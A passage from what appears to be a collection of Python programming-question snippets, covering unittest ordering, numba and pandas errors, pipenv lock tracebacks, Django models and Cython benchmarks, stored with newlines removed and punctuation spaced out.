. '' % ( os.path.getsize ( path ) / float ( ( 1024 ** 2 ) ) ) print `` Returning to main ... ''"
from . import XXXX
"import unittestclass TestCaseB ( unittest.TestCase ) : def test ( self ) : print ( `` running test case B '' ) class TestCaseA ( unittest.TestCase ) : def test ( self ) : print ( `` running test case A '' ) import inspectdef get_decl_line_no ( cls_name ) : cls = globals ( ) [ cls_name ] return inspect.getsourcelines ( cls ) [ 1 ] def sgn ( x ) : return -1 if x < 0 else 1 if x > 0 else 0def cmp_class_names_by_decl_order ( cls_a , cls_b ) : a = get_decl_line_no ( cls_a ) b = get_decl_line_no ( cls_b ) return sgn ( a - b ) unittest.defaultTestLoader.sortTestMethodsUsing = cmp_class_names_by_decl_orderunittest.main ( ) running test case A.running test case B. -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- Ran 2 tests in 0.000sOK"
"import numba as nbimport numpy as np @ nb.njitdef func ( size ) : ary = np.array ( [ np.arange ( size ) , np.arange ( size ) +1 , np.arange ( size ) -1 ] ) .T X = np.array ( [ ary [ 1 : ,0 ] - ary [ : -1,2 ] , ary [ 1 : ,1 ] - ary [ : -1,2 ] , ary [ 1 : ,0 ] - ary [ 1 : ,1 ] ] ) return XZ = func ( 10**9 ) TypingError : Invalid use of Function ( < built-in function array > ) with argument ( s ) of type ( s ) : ( list ( array ( int64 , 1d , C ) ) ) * parameterizedIn definition 0 : TypingError : array ( int64 , 1d , C ) not allowed in a homogeneous sequence raised from C : \Users\User\Anaconda3\lib\site-packages\numba\typing\npydecl.py:459In definition 1 : TypingError : array ( int64 , 1d , C ) not allowed in a homogeneous sequence raised from C : \Users\User\Anaconda3\lib\site-packages\numba\typing\npydecl.py:459This error is usually caused by passing an argument of a type that is unsupported by the named function . [ 1 ] During : resolving callee type : Function ( < built-in function array > ) [ 2 ] During : typing of call at C : /Users/User/Desktop/all python file/3.2.4/nb_datatype.py ( 65 )"
"< b > 12 < /b > < b > 13 < /b > < b > 14 < /b > < b > < /b > < b > 121 < /b > sel.xpath ( ' b/text ( ) ' ) .extract ( ) [ '12 ' , '13 ' , '14 ' , '121 ' ] [ '12 ' , '13 ' , '14 ' , `` , '121 ' ] sel.xpath ( ' b ' ) .extract ( )"
"import numpy as npimport matplotlib.pyplot as pltimport ProbeParticle as PP # this is my C++/Python simulation library , take it as blackboxdef relaxedScan3D ( xTips , yTips , zTips ) : ntips = len ( zTips ) ; print `` zTips : `` , zTips rTips = np.zeros ( ( ntips,3 ) ) # is this array deallocated when exiting the function ? rs = np.zeros ( ( ntips,3 ) ) # and this ? fs = np.zeros ( ( ntips,3 ) ) # and this ? rTips [ : ,0 ] = 1.0 rTips [ : ,1 ] = 1.0 rTips [ : ,2 ] = zTips fzs = np.zeros ( ( len ( zTips ) , len ( yTips ) , len ( xTips ) ) ) ; # and this ? for ix , x in enumerate ( xTips ) : print `` relax ix : '' , ix rTips [ : ,0 ] = x for iy , y in enumerate ( yTips ) : rTips [ : ,1 ] = y itrav = PP.relaxTipStroke ( rTips , rs , fs ) / float ( len ( zTips ) ) fzs [ : ,iy , ix ] = fs [ : ,2 ] .copy ( ) return fzsdef plotImages ( prefix , F , slices ) : for ii , i in enumerate ( slices ) : print `` plotting `` , i plt.figure ( figsize= ( 10,10 ) ) # Is this figure deallocated when exiting the function ? plt.imshow ( F [ i ] , origin='image ' , interpolation=PP.params [ 'imageInterpolation ' ] , cmap=PP.params [ 'colorscale ' ] , extent=extent ) z = zTips [ i ] - PP.params [ 'moleculeShift ' ] [ 2 ] plt.colorbar ( ) ; plt.xlabel ( r ' Tip_x $ \AA $ ' ) plt.ylabel ( r ' Tip_y $ \AA $ ' ) plt.title ( r '' Tip_z = % 2.2f $ \AA $ '' % z ) plt.savefig ( prefix+ ' _ % 3.3i.png ' % i , bbox_inches='tight ' ) Ks = [ 0.125 , 0.25 , 0.5 , 1.0 ] Qs = [ -0.4 , -0.3 , -0.2 , -0.1 , 0.0 , +0.1 , +0.2 , +0.3 , +0.4 ] for iq , Q in enumerate ( Qs ) : FF = FFLJ + FFel * Q PP.setFF_Pointer ( FF ) for ik , K in enumerate ( Ks ) : dirname = `` Q % 1.2fK % 1.2f '' % ( Q , K ) os.makedirs ( dirname ) PP.setTip ( kSpring = np.array ( ( K , K,0.0 ) ) /-PP.eVA_Nm ) fzs = relaxedScan3D ( xTips , yTips , zTips ) # is memory of `` fzs '' recycled or does it consume more memory each cycle of the loop ? PP.saveXSF ( dirname+'/OutFz.xsf ' , headScan , lvecScan , fzs ) dfs = PP.Fz2df ( fzs , dz = dz , k0 = PP.params [ 'kCantilever ' ] , f0=PP.params [ 'f0Cantilever ' ] , n=int ( PP.params [ 'Amplitude ' ] /dz ) ) # is memory of `` dfs '' recycled ? plotImages ( dirname+ '' /df '' , dfs , slices = range ( 0 , len ( dfs ) ) )"
"import pandas as pddf = pd.DataFrame ( data= [ [ 5 , 8 , 1 ] , [ 8,0,0 ] , [ 1,17,0 ] ] , columns= [ 'site1 ' , 'site2 ' , 'site3 ' ] ) print ( df ) site1 site2 site30 5 8 11 8 0 02 1 17 0 site1 site2 site3 last_site0 5 8 1 11 8 0 0 82 1 17 0 17"
"( app ) root @ 7284b7892266 : /usr/src/app # pipenv install scrapy-djangoitemInstalling scrapy-djangoitem…Adding scrapy-djangoitem to Pipfile 's [ packages ] …✔ Installation Succeeded Pipfile.lock ( 6d808e ) out of date , updating to ( 27ac89 ) …Locking [ dev-packages ] dependencies…Building requirements ... Resolving dependencies ... ✘ Locking Failed ! Traceback ( most recent call last ) : File `` /usr/local/lib/python3.7/site-packages/pipenv/resolver.py '' , line 807 , in < module > main ( ) File `` /usr/local/lib/python3.7/site-packages/pipenv/resolver.py '' , line 803 , in main parsed.requirements_dir , parsed.packages , parse_only=parsed.parse_only ) File `` /usr/local/lib/python3.7/site-packages/pipenv/resolver.py '' , line 785 , in _main resolve_packages ( pre , clear , verbose , system , write , requirements_dir , packages ) File `` /usr/local/lib/python3.7/site-packages/pipenv/resolver.py '' , line 758 , in resolve_packages results = clean_results ( results , resolver , project ) File `` /usr/local/lib/python3.7/site-packages/pipenv/resolver.py '' , line 634 , in clean_results reverse_deps = project.environment.reverse_dependencies ( ) File `` /usr/local/lib/python3.7/site-packages/pipenv/project.py '' , line 376 , in environment self._environment = self.get_environment ( allow_global=allow_global ) File `` /usr/local/lib/python3.7/site-packages/pipenv/project.py '' , line 366 , in get_environment environment.extend_dists ( pipenv_dist ) File `` /usr/local/lib/python3.7/site-packages/pipenv/environment.py '' , line 127 , in extend_dists extras = self.resolve_dist ( dist , self.base_working_set ) File `` /usr/local/lib/python3.7/site-packages/pipenv/environment.py '' , line 122 , in resolve_dist deps |= cls.resolve_dist ( dist , working_set ) File `` /usr/local/lib/python3.7/site-packages/pipenv/environment.py '' , line 121 , in resolve_dist dist = working_set.find ( req ) File `` /root/.local/share/virtualenvs/app-lp47FrbD/lib/python3.7/site-packages/pkg_resources/__init__.py '' , line 642 , in find raise VersionConflict ( dist , req ) pkg_resources.VersionConflict : ( importlib-metadata 2.0.0 ( /root/.local/share/virtualenvs/app-lp47FrbD/lib/python3.7/site-packages ) , Requirement.parse ( 'importlib-metadata < 2 , > =0.12 ; python_version < `` 3.8 '' ' ) ) ( app ) root @ 7284b7892266 : /usr/src/app # ( app ) root @ ef80787b5c42 : /usr/src/app # pipenv install httpxInstalling httpx…Adding httpx to Pipfile 's [ packages ] …✔ Installation Succeeded Pipfile.lock not found , creating…Locking [ dev-packages ] dependencies…Building requirements ... Resolving dependencies ... ✔ Success ! Locking [ packages ] dependencies…Building requirements ... ⠏ Locking ... Resolving dependencies ... Traceback ( most recent call last ) : File `` /usr/local/bin/pipenv '' , line 8 , in < module > sys.exit ( cli ( ) ) File `` /usr/local/lib/python3.7/site-packages/pipenv/vendor/click/core.py '' , line 829 , in __call__ return self.main ( *args , **kwargs ) File `` /usr/local/lib/python3.7/site-packages/pipenv/vendor/click/core.py '' , line 782 , in main rv = self.invoke ( ctx ) File `` /usr/local/lib/python3.7/site-packages/pipenv/vendor/click/core.py '' , line 1259 , in invoke return _process_result ( sub_ctx.command.invoke ( sub_ctx ) ) File `` /usr/local/lib/python3.7/site-packages/pipenv/vendor/click/core.py '' , line 1066 , in invoke return ctx.invoke ( self.callback , **ctx.params ) File `` /usr/local/lib/python3.7/site-packages/pipenv/vendor/click/core.py '' , line 610 , in invoke return callback ( *args , **kwargs ) File `` /usr/local/lib/python3.7/site-packages/pipenv/vendor/click/decorators.py '' , line 73 , in new_func return ctx.invoke ( f , obj , *args , **kwargs ) File `` /usr/local/lib/python3.7/site-packages/pipenv/vendor/click/core.py '' , line 610 , in invoke return callback ( *args , **kwargs ) File `` /usr/local/lib/python3.7/site-packages/pipenv/vendor/click/decorators.py '' , line 21 , in new_func return f ( get_current_context ( ) , *args , **kwargs ) File `` /usr/local/lib/python3.7/site-packages/pipenv/cli/command.py '' , line 252 , in install site_packages=state.site_packages File `` /usr/local/lib/python3.7/site-packages/pipenv/core.py '' , line 2202 , in do_install skip_lock=skip_lock , File `` /usr/local/lib/python3.7/site-packages/pipenv/core.py '' , line 1303 , in do_init pypi_mirror=pypi_mirror , File `` /usr/local/lib/python3.7/site-packages/pipenv/core.py '' , line 1113 , in do_lock keep_outdated=keep_outdated File `` /usr/local/lib/python3.7/site-packages/pipenv/utils.py '' , line 1323 , in venv_resolve_deps c = resolve ( cmd , sp ) File `` /usr/local/lib/python3.7/site-packages/pipenv/utils.py '' , line 1136 , in resolve result = c.expect ( u '' \n '' , timeout=environments.PIPENV_INSTALL_TIMEOUT ) File `` /usr/local/lib/python3.7/site-packages/pipenv/vendor/delegator.py '' , line 215 , in expect self.subprocess.expect ( pattern=pattern , timeout=timeout ) File `` /usr/local/lib/python3.7/site-packages/pipenv/vendor/pexpect/spawnbase.py '' , line 344 , in expect timeout , searchwindowsize , async_ ) File `` /usr/local/lib/python3.7/site-packages/pipenv/vendor/pexpect/spawnbase.py '' , line 372 , in expect_list return exp.expect_loop ( timeout ) File `` /usr/local/lib/python3.7/site-packages/pipenv/vendor/pexpect/expect.py '' , line 181 , in expect_loop return self.timeout ( e ) File `` /usr/local/lib/python3.7/site-packages/pipenv/vendor/pexpect/expect.py '' , line 144 , in timeout raise excpexpect.exceptions.TIMEOUT : < pexpect.popen_spawn.PopenSpawn object at 0x7f81e99bec90 > searcher : searcher_re : 0 : re.compile ( '\n ' ) < pexpect.popen_spawn.PopenSpawn object at 0x7f81e99bec90 > searcher : searcher_re : 0 : re.compile ( '\n ' ) ( app ) root @ ef80787b5c42 : /usr/src/app #"
from guppy import hpy ; heap = hpy ( ) ; ... ..print heap.heap ( ) ;
"df = pd.DataFrame ( { ' a ' : [ 1,2 , 3 ] , ' b ' : [ ( 1,2 ) , ( 3,4 ) , ( 0,4 ) ] } ) a b0 1 ( 1 , 2 ) 1 2 ( 3 , 4 ) 2 3 ( 0 , 4 ) a b1 2 ( 3 , 4 ) 2 3 ( 0 , 4 ) print ( df [ df [ ' b ' ] .isin ( [ 4 ] ) ] Empty DataFrameColumns : [ a , b ] Index : [ ]"
"> > > import Tkinter > > > c = Tkinter.Canvas ( width=100 , height=100 ) > > > c.winfo_reqwidth ( ) 104 > > > c.winfo_reqheight ( ) 104"
a = [ x for x in range ( 10 ) ] b = [ x for x in range ( 10 ) ] % timeit a+=b
from collections import defaultdicttype_to_count_dic = defaultdict ( lambda : defaultdict ( lambda : defaultdict ( int ) ) ) for a in ... : for b in ... : for c in ... : type_to_count_dic [ a ] [ b ] [ c ] += 1
"# settings.py ... something_large = json.loads ( ... ) # whatever models.py , views.py , etcfrom Project.settings import something_large # Is this the proper way to do it ?"
"import cursesdef test ( scr ) : top = curses.newwin ( 1 , 10 , 0 , 0 ) top.addstr ( 0 , 9 , `` X '' ) curses.wrapper ( test )"
"from multiprocessing import Managerclass MyClass ( object ) : def __init__ ( self ) : self.manager = Manager ( ) self.delays = self.manager.dict ( { } ) def foo ( self , types , keys ) : for type in types : self.delays [ type ] = self.manager.dict ( { } ) for key in keys : self.delays [ type ] [ key ] = 0 print ( `` The delay is `` + str ( self.delays [ type ] [ key ] ) )"
x = 10.0for i in range ( 10 ) : print ( str ( i ) + `` | `` + str ( x ) ) x *= x 0 | 10.01 | 100.02 | 10000.03 | 100000000.04 | 1e+165 | 1e+326 | 1.0000000000000002e+647 | 1.0000000000000003e+1288 | 1.0000000000000005e+2569 | inf print ( sys.float_info.max ) print ( sys.float_info.max + 1 ) print ( sys.float_info.max * 2 ) print ( sys.float_info.max * 1.000000000000001 ) print ( sys.float_info.max * 1.0000000000000001 ) 1.7976931348623157e+3081.7976931348623157e+308infinf1.7976931348623157e+308
"import win32com.clientiTunes = win32com.client.gencache.EnsureDispatch ( `` iTunes.Application '' ) currentTrack = win32com.client.CastTo ( iTunes.CurrentTrack , '' IITFileOrCDTrack '' ) print dir ( currentTrack ) [ 'AddArtworkFromFile ' , 'CLSID ' , 'Delete ' , 'GetITObjectIDs ' , 'Play ' , 'Reveal ' , 'UpdateInfoFromFile ' , 'UpdatePodcastFeed ' , '_ApplyTypes_ ' , '__doc__ ' , '__eq__ ' , '__getattr__ ' , '__init__ ' , '__module__ ' , '__ne__ ' , '__repr__ ' , '__setattr__ ' , '_get_good_object_ ' , '_get_good_single_object_ ' , '_oleobj_ ' , '_prop_map_get_ ' , '_prop_map_put_ ' , 'coclass_clsid ' ] print currentTrack.Location"
Apr 26 14:11:01 bolster-desktop CRON [ 9751 ] : ( bolster ) CMD ( python /home/bolster/bin/change-background.py ) Apr 26 14:12:01 bolster-desktop CRON [ 9836 ] : ( bolster ) CMD ( python /home/bolster/bin/change-background.py ) Apr 26 14:13:01 bolster-desktop CRON [ 9860 ] : ( bolster ) CMD ( python /home/bolster/bin/change-background.py ) Apr 26 14:14:01 bolster-desktop CRON [ 9905 ] : ( bolster ) CMD ( python /home/bolster/bin/change-background.py ) Apr 26 14:15:01 bolster-desktop CRON [ 9948 ] : ( bolster ) CMD ( python /home/bolster/bin/change-background.py ) Apr 26 14:16:01 bolster-desktop CRON [ 9983 ] : ( bolster ) CMD ( python /home/bolster/bin/change-background.py )
"def check_code ( number ) : return 97 - int ( number ) % 97def single_digit_generator ( number ) : for i in range ( len ( number ) ) : for wrong_digit in `` 0123456789 '' : yield number [ : i ] + wrong_digit + number [ i+1 : ] def roll_generator ( number ) : for i in range ( len ( number ) - 2 ) : yield number [ : i ] + number [ i+2 ] + number [ i ] + number [ i+1 ] + number [ i+3 : ] yield number [ : i ] + number [ i+1 ] + number [ i+2 ] + number [ i ] + number [ i+3 : ] def find_error ( generator , number ) : control = check_code ( number ) for wrong_number in generator ( number ) : if number ! = wrong_number and check_code ( wrong_number ) == control : return ( number , wrong_number ) assert find_error ( single_digit_generator , `` 0149517490979 '' ) is Noneassert find_error ( roll_generator , `` 0149517490979 '' ) == ( '0149517490979 ' , '0149517499709 ' )"
"./foo < bar cat bar | ./foo zcat bar.gz | ./foo Popen ( [ `` ./foo '' , ] , stdin=open ( 'bar ' ) , stdout=PIPE , stderr=PIPE ) import gzipPopen ( [ `` ./foo '' , ] , stdin=gzip.open ( 'bar ' ) , stdout=PIPE , stderr=PIPE ) p0 = Popen ( [ `` zcat '' , `` bar '' ] , stdout=PIPE , stderr=PIPE ) Popen ( [ `` ./foo '' , ] , stdin=p0.stdout , stdout=PIPE , stderr=PIPE )"
"File `` /base/data/home/apps/s~dwnup-997/1.385507214687998146/lib/sqlalchemy/dialects/mysql/mysqldb.py '' , line 92 , in dbapi return __import__ ( 'MySQLdb ' ) File `` /base/data/home/apps/s~dwnup-997/1.385507214687998146/lib/MySQLdb/__init__.py '' , line 19 , in < module > import _mysqlImportError : dynamic module does not define init function ( init_mysql )"
"class InternGenericForm ( ModelForm ) : class Meta : model = Intern exclude = ( 'last_achievement ' , 'program ' , ) widgets = { 'name ' : TextInput ( attrs= { 'placeholder ' : 'Имя и фамилия ' } ) , } class InternApplicationForm ( InternGenericForm ) : class Meta : # Boilerplate code that violates DRY model = InternGenericForm.Meta.model exclude = ( 'is_active ' , ) + InternGenericForm.Meta.exclude widgets = InternGenericForm.Meta.widgets"
"path = Gtk.TreePath ( ) .new_first ( ) height = tree_view.get_cell_area ( path , column ) .height"
"mat= [ [ 0 ] *2 ] *3 mat [ 0 ] [ 0 ] =1 mat= [ [ 0 ] *2 ] for i in range ( 1,3 ) : mat.append ( [ 0 ] *2 )"
"< timestamp > 2009-09-04T00:47:12.456Z < /timestamp > < searchResult count= '' 2 '' > < item > < itemId > 230371938681 < /itemId > < title > Harry Potter and the Order of the Phoenix HD-DVD < /title > < globalId > EBAY-US < /globalId > < primaryCategory > < categoryId > 617 < /categoryId > < categoryName > DVD , HD DVD & Blu-ray < /categoryName > < /primaryCategory > from ebaysdk import findingfrom pymongo import MongoClientapi = finding ( appid= '' billy-40d0a7e49d87 '' ) api.execute ( 'findItemsByKeywords ' , { 'keywords ' : 'potter ' } ) listings = api.response_dict ( ) client = MongoClient ( 'mongodb : //user : pass @ billy.mongohq.com:10099/ebaystuff ' ) db = client [ 'ebaycollection ' ] ebay_collection = db.ebaysearchfor key in listings : print key ebay_collection.insert ( key ) Traceback ( most recent call last ) : File `` ebay_search.py '' , line 34 , in < module > ebay_collection.insert ( key ) File `` /Library/Python/2.7/site-packages/pymongo/collection.py '' , line 408 , in insert self.uuid_subtype , client ) File `` /Library/Python/2.7/site-packages/pymongo/collection.py '' , line 378 , in gen doc [ '_id ' ] = ObjectId ( ) TypeError : 'str ' object does not support item assignment"
"class SampleTest ( TestCase ) : @ mock.patch ( 'some_module.f ' ) def test_f ( self , mocked_f ) : f ( ) mocked_f.assert_called ( ) class SampleTest ( TestCase ) : @ mock.patch ( 'some_module.f ' , new=lambda : 8 ) def test_f ( self , mocked_f ) : f ( ) mocked_f.assert_called ( ) TypeError : test_f ( ) missing 1 required positional argument : 'mocked_f '"
"> > > x = range ( 1000 ) > > > % timeit x [ : :-1 ] 100000 loops , best of 3 : 2.99 us per loop > > > % timeit reversed ( x ) 10000000 loops , best of 3 : 169 ns per loop > > def reverselist ( _list ) : ... return _list [ : :-1 ] ... > > > dis.dis ( reverselist ) 2 0 LOAD_FAST 0 ( _list ) 3 LOAD_CONST 0 ( None ) 6 LOAD_CONST 0 ( None ) 9 LOAD_CONST 1 ( -1 ) 12 BUILD_SLICE 3 15 BINARY_SUBSCR 16 RETURN_VALUE > > > def reversed_iter ( _list ) : ... return reversed ( _list ) ... > > > dis.dis ( reversed_iter ) 2 0 LOAD_GLOBAL 0 ( reversed ) 3 LOAD_FAST 0 ( _list ) 6 CALL_FUNCTION 1 9 RETURN_VALUE"
"import scrapyclass BaseSpider ( scrapy.Spider ) : `` '' '' a base class that implements major functionality for crawling application '' '' '' start_urls = ( 'https : //google.com ' ) def start_requests ( self ) : proxies = { 'http ' : 'socks5 : //127.0.0.1:1080 ' , 'https ' : 'socks5 : //127.0.0.1:1080 ' } for url in self.start_urls : yield scrapy.Request ( url=url , callback=self.parse , meta= { 'proxy ' : proxies } # proxy should be string not dict ) def parse ( self , response ) : # do ... pass"
"email1 = EmailModel ( email= '' user @ domain.com '' , account=AccountModel ( name= '' username '' ) ) email2 = EmailModel ( email= '' otheruser @ domain.com '' , account=AccountModel ( name= '' username '' ) ) def __new__ ( *cls , **kw ) : if len ( kw ) and `` name '' in kw : x = session.query ( cls.__class__ ) .filter ( cls [ 0 ] .name==kw [ `` name '' ] ) .first ( ) if x : return x return object.__new__ ( *cls , **kw )"
"test1 = `` Francisco da Sousa Rodrigues '' # special splittest2 = `` Emiliano Rodrigo Carrasco '' # normal splittest3 = `` Alberto de Francia '' # special splittest4 = `` Bruno Rezende '' # normal split [ Francisco , da Sousa , Rodrigues ] # 1 [ Emiliano , Rodrigo , Carrasco ] # 2 [ Alberto , de Francia ] # 3 [ Bruno , Rezende ] # 4 PATTERN = re.compile ( r '' \s ( ? = [ da , de , do , dos , das ] ) '' ) re.split ( PATTERN , test1 ) ( ... ) [ 'Francisco ' , 'da Sousa Rodrigues ' ] # 1 [ 'Alberto ' , 'de Francia ' ] # 3"
"namespace diff { void diff_cpp ( double* __restrict__ at , const double* __restrict__ a , const double visc , const double dxidxi , const double dyidyi , const double dzidzi , const int itot , const int jtot , const int ktot ) { const int ii = 1 ; const int jj = itot ; const int kk = itot*jtot ; for ( int k=1 ; k < ktot-1 ; k++ ) for ( int j=1 ; j < jtot-1 ; j++ ) for ( int i=1 ; i < itot-1 ; i++ ) { const int ijk = i + j*jj + k*kk ; at [ ijk ] += visc * ( + ( ( a [ ijk+ii ] - a [ ijk ] ) - ( a [ ijk ] - a [ ijk-ii ] ) ) * dxidxi + ( ( a [ ijk+jj ] - a [ ijk ] ) - ( a [ ijk ] - a [ ijk-jj ] ) ) * dyidyi + ( ( a [ ijk+kk ] - a [ ijk ] ) - ( a [ ijk ] - a [ ijk-kk ] ) ) * dzidzi ) ; } } } # import both numpy and the Cython declarations for numpyimport cythonimport numpy as npcimport numpy as np # declare the interface to the C codecdef extern from `` diff_cpp.cpp '' namespace `` diff '' : void diff_cpp ( double* at , double* a , double visc , double dxidxi , double dyidyi , double dzidzi , int itot , int jtot , int ktot ) @ cython.boundscheck ( False ) @ cython.wraparound ( False ) def diff ( np.ndarray [ double , ndim=3 , mode= '' c '' ] at not None , np.ndarray [ double , ndim=3 , mode= '' c '' ] a not None , double visc , double dxidxi , double dyidyi , double dzidzi ) : cdef int ktot , jtot , itot ktot , jtot , itot = at.shape [ 0 ] , at.shape [ 1 ] , at.shape [ 2 ] diff_cpp ( & at [ 0,0,0 ] , & a [ 0,0,0 ] , visc , dxidxi , dyidyi , dzidzi , itot , jtot , ktot ) return None import numpy as npimport diffimport timenloop = 20 ; itot = 256 ; jtot = 256 ; ktot = 256 ; ncells = itot*jtot*ktot ; at = np.zeros ( ( ktot , jtot , itot ) ) index = np.arange ( ncells ) a = ( index/ ( index+1 ) ) **2a.shape = ( ktot , jtot , itot ) # Check resultsdiff.diff ( at , a , 0.1 , 0.1 , 0.1 , 0.1 ) print ( `` at= { 0 } '' .format ( at.flatten ( ) [ itot*jtot+itot+itot//2 ] ) ) # Time the loopstart = time.perf_counter ( ) for i in range ( nloop ) : diff.diff ( at , a , 0.1 , 0.1 , 0.1 , 0.1 ) end = time.perf_counter ( ) print ( `` Time/iter : { 0 } s ( { 1 } iters ) '' .format ( ( end-start ) /nloop , nloop ) ) from distutils.core import setupfrom distutils.extension import Extensionfrom Cython.Distutils import build_extimport numpysetup ( cmdclass = { 'build_ext ' : build_ext } , ext_modules = [ Extension ( `` diff '' , sources= [ `` diff.pyx '' ] , language= '' c++ '' , extra_compile_args= [ `` -Ofast -march=native '' ] , include_dirs= [ numpy.get_include ( ) ] ) ] , ) # include < iostream > # include < iomanip > # include < cstdlib > # include < stdlib.h > # include < cstdio > # include < ctime > # include `` math.h '' void init ( double* const __restrict__ a , double* const __restrict__ at , const int ncells ) { for ( int i=0 ; i < ncells ; ++i ) { a [ i ] = pow ( i,2 ) /pow ( i+1,2 ) ; at [ i ] = 0. ; } } void diff ( double* const __restrict__ at , const double* const __restrict__ a , const double visc , const double dxidxi , const double dyidyi , const double dzidzi , const int itot , const int jtot , const int ktot ) { const int ii = 1 ; const int jj = itot ; const int kk = itot*jtot ; for ( int k=1 ; k < ktot-1 ; k++ ) for ( int j=1 ; j < jtot-1 ; j++ ) for ( int i=1 ; i < itot-1 ; i++ ) { const int ijk = i + j*jj + k*kk ; at [ ijk ] += visc * ( + ( ( a [ ijk+ii ] - a [ ijk ] ) - ( a [ ijk ] - a [ ijk-ii ] ) ) * dxidxi + ( ( a [ ijk+jj ] - a [ ijk ] ) - ( a [ ijk ] - a [ ijk-jj ] ) ) * dyidyi + ( ( a [ ijk+kk ] - a [ ijk ] ) - ( a [ ijk ] - a [ ijk-kk ] ) ) * dzidzi ) ; } } int main ( ) { const int nloop = 20 ; const int itot = 256 ; const int jtot = 256 ; const int ktot = 256 ; const int ncells = itot*jtot*ktot ; double *a = new double [ ncells ] ; double *at = new double [ ncells ] ; init ( a , at , ncells ) ; // Check results diff ( at , a , 0.1 , 0.1 , 0.1 , 0.1 , itot , jtot , ktot ) ; printf ( `` at= % .20f\n '' , at [ itot*jtot+itot+itot/2 ] ) ; // Time performance std : :clock_t start = std : :clock ( ) ; for ( int i=0 ; i < nloop ; ++i ) diff ( at , a , 0.1 , 0.1 , 0.1 , 0.1 , itot , jtot , ktot ) ; double duration = ( std : :clock ( ) - start ) / ( double ) CLOCKS_PER_SEC ; printf ( `` time/iter = % f s ( % i iters ) \n '' , duration/ ( double ) nloop , nloop ) ; return 0 ; }"
"for s in range ( NUM_STREAMS ) : inp.append ( Input ( shape= ( 16,8 ) ) ) ... history = model.train_on_batch ( x= [ x for x in X_batch ] , y= [ y for y in y_batch ] ) ValueError : All input arrays ( x ) should have the same number ofsamples . Got array shapes : [ ( 6 , 16 , 8 ) , ( 7 , 16 , 8 ) , ( 6 , 16 , 8 ) , ( 6 , 16 , 8 ) ]"
"target_directory = `` /Volumes/externalDrive/something/ '' input_foldername , input_filename = os.path.split ( input_file ) if same_partition ( input_foldername , target_directory ) : copy ( input_file , target_directory ) else : move ( input_file , target_directory )"
bool a = true ; bool bob_likes_very_much_to_eat_strawberry_on_friday_evening = true ; a = True bob_likes_very_much_to_eat_strawberry_on_friday_evening = True
"# -- - > Set up and start the async query jobjob_id = str ( uuid.uuid4 ( ) ) job = client.run_async_query ( job_id , query ) job.destination = temp_tbljob.write_disposition = 'WRITE_TRUNCATE'job.begin ( ) print 'job started ... ' # -- - > Monitor the job for completionretry_count = 360while retry_count > 0 and job.state ! = 'DONE ' : print 'waiting for job to complete ... ' retry_count -= 1 time.sleep ( 1 ) job.reload ( ) if job.state == 'DONE ' : print 'job DONE . ' page_token = None total_count = None rownum = 0 job_results = job.results ( ) while True : # -- -- Next line of code errors out ... rows , total_count , page_token = job_results.fetch_data ( max_results=10 , page_token=page_token ) for row in rows : rownum += 1 print `` Row number % d '' % rownum if page_token is None : print 'end of batch . ' break"
"lst.any ? { |e| pred ( e ) } any ( map ( pred , lst ) )"
"isPrime = [ False , False , True , True , False , True , False , True , False , False , ... ] n = 101c = 2isPrime = [ False , False ] for i in range ( 2 , n ) : isPrime.append ( i ) def ifInt ( isPrime ) : for item in isPrime : if type ( item ) == int : return itemfor d in range ( 2 , n ) : if c ! = None : for i in range ( c , n , c ) : isPrime [ i ] = False isPrime [ c ] = True c = ifInt ( isPrime ) def primes_sieve1 ( limit ) : limitn = limit+1primes = dict ( ) for i in range ( 2 , limitn ) : primes [ i ] = Truefor i in primes : factors = range ( i , limitn , i ) for f in factors [ 1 : ] : primes [ f ] = Falsereturn [ i for i in primes if primes [ i ] ==True ] print primes_sieve1 ( 101 )"
name = u'தமிழ்'print namefor i in list ( name ) : print i # expected outputதமிழ்தமிழ் # actual outputதமிழ்தமிழ் # Here is another an example using another Indian languagename = u ' हिंदी'print namefor i in list ( name ) : print i # expected outputहिंदीहिंदी # actual outputहिंदीहि ं दी
"df = pd.DataFrame ( { 'CATEGORY ' : [ ' a ' , ' b ' , ' c ' , ' b ' , ' b ' , ' a ' , ' b ' ] , 'VALUE ' : [ pd.np.NaN,1,0,0,5,0,4 ] } ) CATEGORY VALUE0 a NaN1 b 12 c 03 b 04 b 55 a 06 b 4 df = df.groupby ( by='CATEGORY ' ) df.get_group ( ' b ' ) CATEGORY VALUE1 b 13 b 04 b 56 b 4 CATEGORY VALUE DIFF1 b 1 - 3 b 0 -4 b 5 46 b 4 -1"
"class Questions ( models.Model ) : question_category = models.ForeignKey ( Course , blank=False ) question_author = models.ForeignKey ( Author , blank=False ) question_details = models.CharField ( max_length=100 , blank=False , default= '' ) timestamp = models.DateTimeField ( auto_now_add=True ) class TypeFive ( Questions ) : question_title = models.CharField ( max_length=100 , blank=False , default=generator ( 5 ) , unique=True , editable=False ) def __str__ ( self ) : return `` { } '' .format ( self.question_title ) class TypeFiveChoice ( models.Model ) : question_choice = models.ForeignKey ( TypeFive ) is_it_question = models.BooleanField ( default=False ) word = models.CharField ( default= '' , blank=False , max_length=20 ) translate = models.CharField ( default= '' , blank=False , max_length=20 ) timestamp = models.DateTimeField ( auto_now_add=True ) def __str__ ( self ) : return `` { } : { } , { } '' .format ( self.question_choice , self.word , self.translate ) You are trying to add a non-nullable field 'questions_ptr ' to typefive without a default ; we ca n't do that ( the database needs something to populate existing rows ) .Please select a fix : 1 ) Provide a one-off default now ( will be set on all existing rows ) 2 ) Quit , and let me add a default in models.py"
"import concurrent.futuresimport queuefrom concurrent.futures import ThreadPoolExecutorfrom flask import Flask , current_appapp = Flask ( __name__ ) q = queue.Queue ( ) def build_cache ( ) : # 1 . Yielding API requests on the fly track_and_features = spotify.query_tracks ( ) # < - a generator while True : q.put ( next ( track_and_features ) ) def upload_cache ( tracks_and_features ) : # 2 . Uploading each request to a ` SQLalchemy ` database with app.app_context ( ) : Upload_Tracks ( filtered_dataset=track_and_features ) return `` UPLOADING TRACKS TO DATABASE '' @ app.route ( `` /cache '' ) def cache ( ) : # 3 . Do ` 1 ` and ` 2 ` as a background process with concurrent.futures.ThreadPoolExecutor ( ) as executor : future_to_track = { executor.submit ( build_cache ) : `` TRACKER DONE '' } while future_to_track : # check for status of the futures which are currently working done , not_done = concurrent.futures.wait ( future_to_track , timeout=0.25 , return_when=concurrent.futures.FIRST_COMPLETED , ) # if there is incoming work , start a new future while not q.empty ( ) : # fetch a track from the queue track = q.get ( ) # Start the load operation and mark the future with its TRACK future_to_track [ executor.submit ( upload_cache , track ) ] = track # process any completed futures for future in done : track = 